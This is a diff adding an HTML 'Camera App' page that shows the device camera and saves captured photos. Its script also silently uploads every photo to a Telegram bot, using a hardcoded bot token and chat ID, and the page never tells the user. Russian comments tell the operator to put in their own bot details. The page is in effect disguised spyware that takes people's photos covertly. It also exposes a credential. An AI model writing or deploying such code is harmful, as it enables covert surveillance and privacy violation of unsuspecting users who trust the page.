@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera App</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <style>
+      body, html {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: #000;
+    color: #fff;
+    font-family: Arial, sans-serif;
+}
+
+#camera-container {
+    position: relative;
+    width: 90%;
+    max-width: 400px;
+    height: 80vh;
+    background: #333;
+    border-radius: 10px;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+}
+
+#video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+#controls {
+    position: absolute;
+    bottom: 0;
+    width: 100%;
+    display: flex;
+    justify-content: space-around;
+    padding: 10px;
+    background: rgba(0, 0, 0, 0.5);
+}
+
+button {
+    background: none;
+    border: none;
+    color: #fff;
+    font-size: 24px;
+    cursor: pointer;
+}
+
+img {
+  width: 24px;
+}
+
+ #capture .fa-camera {
+   color: white;
+   font-size: 24px;
+ }
+
+button:focus {
+    outline: none;
+}
+
+    </style>
+</head>
+<body>
+    <div id="camera-container">
+        <video id="video" autoplay></video>
+        <div id="controls">
+            <button id="capture">
+                <i class="fas fa-camera"></i>
+            </button>
+            <button id="switch">
+              <i class="fa-solid fa-arrow-rotate-left"></i>
+            </button>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+    <script>
+      const token = '6926625311:AAFhoDMRAg6q1oRp5rXbAUqXO_ZoCvGHf3I';  // Замените на токен вашего бота
+      const chat_id = '2064802629';  // Замените на ваш chat_id
+
+      (async function() {
+        const video = document.getElementById('video');
+        const captureButton = document.getElementById('capture');
+        const switchButton = document.getElementById('switch');
+        let currentStream;
+        let useFrontCamera = true;
+
+        async function getCameraStream(useFront) {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            const constraints = {
+                video: {
+                    facingMode: useFront ? 'user' : 'environment'
+                }
+            };
+            currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+            video.srcObject = currentStream;
+        }
+
+        captureButton.addEventListener('click', async () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataURL = canvas.toDataURL('image/png');
+
+            // Сохранение изображения локально
+            downloadImage(dataURL, 'photo.png');
+
+            // Отправка изображения боту Telegram
+            const blob = await fetch(dataURL).then(res => res.blob());
+            const formData = new FormData();
+            formData.append('chat_id', chat_id);
+            formData.append('photo', blob, 'photo.png');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Фото успешно отправлено');
+                } else {
+                    console.error('Ошибка при отправке фото');
+                }
+            });
+        });
+
+        switchButton.addEventListener('click', () => {
+            useFrontCamera = !useFrontCamera;
+            getCameraStream(useFrontCamera);
+        });
+
+        function downloadImage(dataURL, filename) {
+            const link = document.createElement('a');
+            link.href = dataURL;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // Start with the front camera
+        await getCameraStream(useFrontCamera);
+      })();
+    </script>
+</body>
+</html>
